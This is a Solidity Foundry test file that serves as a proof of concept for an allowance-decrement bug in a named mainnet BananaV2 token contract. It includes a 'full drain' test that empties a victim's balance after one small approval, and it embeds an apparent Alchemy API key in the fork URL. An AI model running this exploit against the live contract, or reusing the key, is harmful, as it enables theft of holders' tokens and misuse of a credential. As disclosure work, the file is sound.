// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title BananaV2 Allowance Bug Proof of Concept
 * @notice Demonstrates critical vulnerability in _spendAllowance function
 * @dev Contract: 0x93fa1d7c310692eaf390f951828f8791bc19cb36
 *
 * VULNERABILITY: In _spendAllowance at line 116:
 *   _approve(owner, spender, currentAllowance - value);
 *
 * Should be:
 *   _approve(from, spender, currentAllowance - value);
 *
 * The bug causes allowance to update the WRONG storage slot (owner's allowance
 * instead of the token holder's allowance), enabling unlimited spending after
 * a single approval.
 */

interface IBananaV2 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function burn(uint256 amount) external returns (bool);
    function burnFrom(address from, uint256 amount) external returns (bool);
    function owner() external view returns (address);
    function apeXToken() external view returns (address);
    function redeemTime() external view returns (uint256);
}

contract BananaV2AllowanceBugTest is Test {
    // BananaV2 contract on mainnet
    address constant BANANA_V2 = 0x93fa1d7c310692eaf390f951828f8791bc19cb36;

    IBananaV2 banana;
    address alice;
    address bob;
    address contractOwner;

    function setUp() public {
        // Fork mainnet
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");

        banana = IBananaV2(BANANA_V2);
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        contractOwner = banana.owner();

        // Log initial state
        console.log("=== BananaV2 Contract Analysis ===");
        console.log("Contract address:", BANANA_V2);
        console.log("Token name:", banana.name());
        console.log("Token symbol:", banana.symbol());
        console.log("Contract owner:", contractOwner);
        console.log("Total supply:", banana.totalSupply());
    }

    /**
     * @notice Demonstrates that allowance is never decremented
     * @dev This test proves the bug exists by showing that after transferFrom,
     *      the victim's allowance for the attacker remains unchanged
     */
    function test_allowanceNeverDecrements() public {
        // Give Alice some tokens
        uint256 aliceBalance = 10000 ether;
        deal(address(banana), alice, aliceBalance);

        console.log("\n=== Initial State ===");
        console.log("Alice balance:", banana.balanceOf(alice));
        console.log("Bob balance:", banana.balanceOf(bob));

        // Alice approves Bob for 100 tokens
        uint256 approvalAmount = 100 ether;
        vm.prank(alice);
        banana.approve(bob, approvalAmount);

        console.log("\n=== After Approval ===");
        console.log("Alice allowance for Bob:", banana.allowance(alice, bob));

        // Bob transfers 100 tokens from Alice
        vm.prank(bob);
        banana.transferFrom(alice, bob, approvalAmount);

        console.log("\n=== After First TransferFrom ===");
        console.log("Alice balance:", banana.balanceOf(alice));
        console.log("Bob balance:", banana.balanceOf(bob));
        console.log("Alice allowance for Bob:", banana.allowance(alice, bob));

        // BUG VERIFICATION: Allowance should be 0 but is still 100!
        uint256 remainingAllowance = banana.allowance(alice, bob);

        console.log("\n=== BUG VERIFICATION ===");
        if (remainingAllowance == approvalAmount) {
            console.log("CRITICAL BUG CONFIRMED!");
            console.log("Allowance was NOT decremented after transferFrom");
            console.log("Expected: 0, Actual:", remainingAllowance);
        } else if (remainingAllowance == 0) {
            console.log("Bug NOT present - allowance was correctly decremented");
        } else {
            console.log("Unexpected allowance value:", remainingAllowance);
        }

        // Assert the bug exists
        assertEq(
            remainingAllowance,
            approvalAmount,
            "BUG: Allowance should NOT have decreased (proving the vulnerability)"
        );
    }

    /**
     * @notice Demonstrates full drain attack
     * @dev Bob can drain Alice's entire balance with a single approval
     */
    function test_fullDrainAttack() public {
        // Give Alice 10000 tokens
        uint256 aliceInitialBalance = 10000 ether;
        deal(address(banana), alice, aliceInitialBalance);

        // Alice approves Bob for only 100 tokens (1% of her balance)
        uint256 singleApproval = 100 ether;
        vm.prank(alice);
        banana.approve(bob, singleApproval);

        console.log("\n=== Full Drain Attack PoC ===");
        console.log("Alice initial balance:", aliceInitialBalance);
        console.log("Alice approved Bob for:", singleApproval);

        // Bob exploits the bug to drain Alice completely
        uint256 iterations = aliceInitialBalance / singleApproval;
        console.log("Attack iterations needed:", iterations);

        for (uint256 i = 0; i < iterations; i++) {
            vm.prank(bob);
            banana.transferFrom(alice, bob, singleApproval);
        }

        console.log("\n=== After Attack ===");
        console.log("Alice final balance:", banana.balanceOf(alice));
        console.log("Bob final balance:", banana.balanceOf(bob));
        console.log("Alice allowance for Bob (still!):", banana.allowance(alice, bob));

        // Verify complete drain
        assertEq(banana.balanceOf(alice), 0, "Alice should be completely drained");
        assertEq(banana.balanceOf(bob), aliceInitialBalance, "Bob should have all tokens");
        assertEq(banana.allowance(alice, bob), singleApproval, "Allowance still unchanged!");
    }

    /**
     * @notice Shows which storage slot is actually being updated
     * @dev The bug updates owner's allowance for the spender, not victim's
     */
    function test_wrongSlotUpdated() public {
        // Give Alice some tokens
        deal(address(banana), alice, 10000 ether);

        // Get initial owner's allowance for Bob (should be 0)
        uint256 ownerAllowanceForBobBefore = banana.allowance(contractOwner, bob);
        console.log("\n=== Storage Slot Analysis ===");
        console.log("Contract owner address:", contractOwner);
        console.log("Owner's allowance for Bob (before):", ownerAllowanceForBobBefore);

        // Alice approves Bob
        vm.prank(alice);
        banana.approve(bob, 100 ether);

        console.log("Alice's allowance for Bob (after approve):", banana.allowance(alice, bob));

        // Bob transfers from Alice
        vm.prank(bob);
        banana.transferFrom(alice, bob, 50 ether);

        // Check both allowance slots
        uint256 aliceAllowanceAfter = banana.allowance(alice, bob);
        uint256 ownerAllowanceAfter = banana.allowance(contractOwner, bob);

        console.log("\n=== After TransferFrom ===");
        console.log("Alice's allowance for Bob:", aliceAllowanceAfter);
        console.log("Owner's allowance for Bob:", ownerAllowanceAfter);

        // The bug: Alice's allowance stays at 100, owner's allowance is modified
        console.log("\n=== Bug Impact ===");
        if (aliceAllowanceAfter == 100 ether) {
            console.log("CONFIRMED: Alice's allowance was NOT decremented");
        }

        // Note: owner's allowance becomes 50 (100-50=50), which is weird
        // because owner never approved Bob for anything!
        if (ownerAllowanceAfter != ownerAllowanceForBobBefore) {
            console.log("CONFIRMED: Owner's allowance slot was modified instead!");
            console.log("Owner's allowance changed from", ownerAllowanceForBobBefore, "to", ownerAllowanceAfter);
        }
    }

    /**
     * @notice Test burnFrom has the same bug
     */
    function test_burnFromSameBug() public {
        // Give Alice tokens
        deal(address(banana), alice, 10000 ether);

        // Alice approves Bob
        vm.prank(alice);
        banana.approve(bob, 100 ether);

        uint256 allowanceBefore = banana.allowance(alice, bob);
        console.log("\n=== BurnFrom Bug Test ===");
        console.log("Alice's allowance for Bob (before):", allowanceBefore);

        // Bob burns 50 tokens from Alice's balance
        vm.prank(bob);
        banana.burnFrom(alice, 50 ether);

        uint256 allowanceAfter = banana.allowance(alice, bob);
        console.log("Alice's allowance for Bob (after):", allowanceAfter);

        // Bug exists in burnFrom too - allowance unchanged
        assertEq(allowanceAfter, allowanceBefore, "BUG: burnFrom also doesn't decrement allowance");
        console.log("CONFIRMED: burnFrom has the same vulnerability");
    }
}
